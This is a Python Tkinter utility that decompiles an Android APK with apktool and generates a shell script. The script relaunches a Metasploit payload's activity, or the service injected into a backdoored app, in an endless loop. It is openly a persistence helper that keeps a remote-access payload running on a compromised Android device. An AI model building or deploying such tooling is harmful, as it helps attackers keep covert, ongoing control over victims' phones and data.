import re
import sys
import subprocess
import shutil
from tkinter import *
import tkinter
from tkinter import filedialog

window = Tk()

def original():
	with open('script.sh', 'w') as f:
		f.write('#!/bin/sh\n'
		'while :\n'
		'do am start --user 0 -a android.intent.action.MAIN -n com.metasploit/.MainActivity\n'
		'sleep 30\n'
		'done\n')
def merged():
	with open('temp/AndroidManifest.xml', 'r') as find:
		lines = find.readlines()
		for temp in lines:
			if re.search(r'service', temp):
				line = temp
		result = re.search('android:name="(.*)"/>', line)
		string = result.group(1)
		res = string.rsplit('.', 2)
		with open('script.sh', 'w') as f:
			f.write('#!/bin/bash\n'
			'while :\n'
			'do am startservice --user 0 '+res[0]+'/.'+res[1]+'.'+res[2]+'\n'
			'sleep 10\n'
			'done')
def browse1():
	window.filename = filedialog.askopenfilename(initialdir = "/", title = "Select Apk", filetypes = (("apk", "*.apk"), ("apk", "*.apk")))
	global apk_path
	apk_path = window.filename
	textentry1.delete(0, END)
	textentry1.insert(0, apk_path)
def browse():
	window.filename = filedialog.askopenfilename(initialdir = "/", title = "Select apktool.jar", filetypes = (("jar", "*.jar"), ("jar", "*.jar")))
	global apk_tool_path
	apk_tool_path = window.filename
	textentry.delete(0, END)
	textentry.insert(0, apk_tool_path)
			

def execute():			
	subprocess.call(["java", "-jar", apk_tool_path, "d", "-f", apk_path, "-o", "temp"])			

	exist = 'false'	
	with open('temp/AndroidManifest.xml', 'r') as find:
		lines = find.readlines()
		for line in lines:
			if re.search(r'metasploit', line):
				exist = 'true'
				
		if exist == 'true':
			original()
		elif exist == 'false':
			merged()
			
	shutil.rmtree("temp")
	print("The script is saved as script.sh")	

window.title("Script Generator")
button1 = tkinter.Button(text = "Browse", command = browse)
button1.grid(column = 2, row = 0, pady=4)

button2 = tkinter.Button(text = "Browse", command = browse1)
button2.grid(column = 2, row = 1, pady=10)

textentry = Entry(window, width=20, bg="white")
textentry.grid(row=0, column=1, sticky=W, padx=2)


textentry1 = Entry(window, width=20, bg="white")
textentry1.grid(row=1, column=1, sticky=W, padx=2)



button3 = tkinter.Button(text = "Generate Script", bd=3, command = execute)
button3.grid(column = 0, row = 2, columnspan=3, sticky="nsew")

Label (window, text="Path to apktool", font="none 12 bold") .grid(row=0, column=0, sticky=W, pady=4)
Label (window, text="Path to apk", font="none 12 bold") .grid(row=1, column=0, sticky=W, pady=10)

window.resizable(width=False, height=False)
window.mainloop()
